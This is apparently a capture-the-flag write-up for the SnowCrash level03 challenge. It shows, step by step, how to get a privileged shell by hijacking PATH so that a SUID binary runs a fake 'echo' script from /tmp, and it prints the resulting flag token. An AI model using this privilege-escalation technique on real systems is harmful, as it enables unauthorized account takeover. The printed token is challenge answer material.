- In `/home/user/level03` we identify a binary `level03` which when launched prints `Exploit me` to the screen. The file has the SUID bit set which means anyone who launches the program will be launching it as the owner `flag03`

```
level03@SnowCrash:~$ pwd
/home/user/level03
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
level03@SnowCrash:~$ ./level03 
Exploit me
```

- Examine the file using `strings` to identify interesting content. We find the command which prints `Exploit me` to screen. 

```
level03@SnowCrash:~$ strings level03 
<snip>
/usr/bin/env echo Exploit me
<snip>
```

- The command is insecure as it does not include the absolute path of `echo` command, so it is possible to create a fake echo binary and add the path to the `PATH` environment variable so that the fake `echo` script is launched before the intended one is.

- We can write to the `/tmp` directory as current user and prepare a script called `echo` which will run `/bin/bash` when launched

```
level03@SnowCrash:~$ echo '#!/bin/bash' >> /tmp/echo
level03@SnowCrash:~$ echo '/bin/bash' >> /tmp/echo
level03@SnowCrash:~$ cat /tmp/echo
#!/bin/bash
/bin/bash
level03@SnowCrash:~$ chmod +x /tmp/echo
```

- We then add `/tmp` directory to the front of the `PATH` environment variable so the `level03` binary looks for `echo` in the `/tmp` directory
```
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

- Now launching `./level03` executes an instance of `bash` as the `flag03` user and get the flag

```
level03@SnowCrash:~$ ./level03 
flag03@SnowCrash:~$ whoami
flag03
flag03@SnowCrash:~$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

- We use the token to authenticate to machine as `level04`

```
flag03@SnowCrash:~$ su level04
Password: 
level04@SnowCrash:~$ 
```